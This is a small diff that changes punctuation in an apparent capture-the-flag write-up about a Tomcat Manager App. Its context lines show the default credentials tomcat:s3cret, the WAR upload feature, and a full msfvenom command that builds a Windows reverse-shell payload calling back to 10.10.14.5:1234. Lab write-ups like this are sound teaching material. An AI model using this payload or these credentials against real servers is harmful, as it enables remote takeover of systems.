@@ -36,7 +36,7 @@ The example credentials that are given are tomcat:s3cret, which I believe was ho
 
 ## Manager App
 
-The first thing that catches my eye in this Manager App is the section to upload a file
+The first thing that catches my eye in this Manager App is the section to upload a file.
 
 ![Untitled](POC/upload.png)
 
@@ -52,7 +52,7 @@ A bit more research shows that I can craft a payload in msfvenom formatted as a 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war > rev.war
 ```
 
-I send the full command to msfvenom and get my file outputted as `rev.war`!
+I send the full command to msfvenom and get my file outputted as `rev.war`
 
 ![Untitled](POC/msfvenom.png)
 
